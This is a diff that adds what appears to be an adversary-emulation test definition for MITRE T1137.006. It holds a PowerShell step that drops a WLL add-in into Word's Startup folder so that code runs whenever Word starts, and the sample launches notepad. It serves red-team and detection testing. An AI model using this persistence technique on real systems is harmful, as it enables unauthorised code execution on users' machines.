@@ -1,0 +1,24 @@
+api_version: "2.0"
+name: Persistent Code Execution Via Word Add-in File (WLL)
+description: "Creates a Word Add-in file (WLL) which runs automatically when Word is started\nThe sample WLL provided launches the notepad as a proof-of-concept for persistent execution from Office.\nSuccessfully tested on 32-bit Office 2016. Not successful from microsoft 365 version of Office. \n"
+uuid: 95408a99-4fa7-4cd6-a7ef-cb65f86351cf
+mitre:
+    tactics:
+        - 'TA0003: Persistence'
+    techniques:
+        - 'T1137: Office Application Startup'
+    subtechniques:
+        - 'T1137.006: Add-ins'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: persistent-code-execution-via-word-add-in-file-(wll)
+      inline: "$wdApp = New-Object -COMObject \"Word.Application\"\nif(-not $wdApp.path.contains(\"Program Files (x86)\"))  \n{\n  Write-Host \"64-bit Office\"\n  Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x64.wll\" \"$env:APPDATA\\Microsoft\\Word\\Startup\\notepad.wll\"        \n}\nelse{\n  Write-Host \"32-bit Office\"\n  Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x86.wll\" \"$env:APPDATA\\Microsoft\\Word\\Startup\\notepad.wll\"\n}\nStop-Process -Name \"WinWord\" \nStart-Process \"WinWord\"\n"
+      executor: powershell
+      cleanup:
+        inline: |
+            Stop-Process -Name "notepad","WinWord" -ErrorAction Ignore
+            Start-Sleep 3
+            Remove-Item "$env:APPDATA\Microsoft\Word\Startup\notepad.wll" -ErrorAction Ignore
+        executor: powershell
